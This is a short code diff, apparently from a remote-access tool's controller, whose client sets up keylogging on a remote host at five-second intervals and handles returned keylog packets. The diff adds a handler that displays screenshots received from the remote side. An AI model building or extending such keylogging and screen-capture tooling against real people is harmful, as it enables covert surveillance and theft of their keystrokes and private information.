@@ -14,6 +14,10 @@ function spawnClient (host, port) {
 
       this._TCPclient.write(Packets.KeylogSetup.create({ interval: 5000 }))
 
+      this.on(Packets.r_Screenshot, function (packet) {
+        this.emit('display', Buffer.from(packet.data.data))
+      })
+
       this.on(Packets.r_Keylog, function (packet) {
         this.emit(
           'keylog',
